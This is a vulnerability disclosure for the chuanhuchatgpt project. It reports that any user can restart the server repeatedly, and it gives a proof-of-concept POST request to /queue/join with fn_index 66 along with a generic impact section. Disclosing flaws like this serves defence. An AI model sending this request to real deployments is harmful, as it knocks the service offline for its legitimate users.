Title: The server can be restarted by any user, any number of times disrupting the whole service. in gaizhenbiao/chuanhuchatgpt

Proof of Concept: 
Send the following request to the server.

POST /queue/join? HTTP/1.1
Host: 127.0.0.1:7860
Cookie:<Cookie_here>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0

Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:7860/

{"data":[],"event_data":null,"fn_index":66,"trigger_id":null,"session_hash":"9alzfpcb0mt"}

Any request at /queue/join? endpoint with "fn_index":66 restarts the server.

Impact: 
Service Disruption:

Unrestricted server restarts have the potential to severely disrupt service availability, causing significant inconvenience to legitimate users and undermining essential business operations.

Data Loss or Corruption:

Abrupt server restarts pose a serious risk of data loss or corruption, especially if ongoing operations or transactions are interrupted without appropriate safeguards in place.

System Compromise:

Repeated unauthorized restarts could destabilize the server environment, leading to system crashes or creating exploitable vulnerabilities that compromise the integrity and security of the entire system.

Trust Erosion:

Inability to prevent unauthorized server restarts undermines user trust and confidence in the application's reliability and security measures, potentially resulting in reputational damage and loss of user trust.
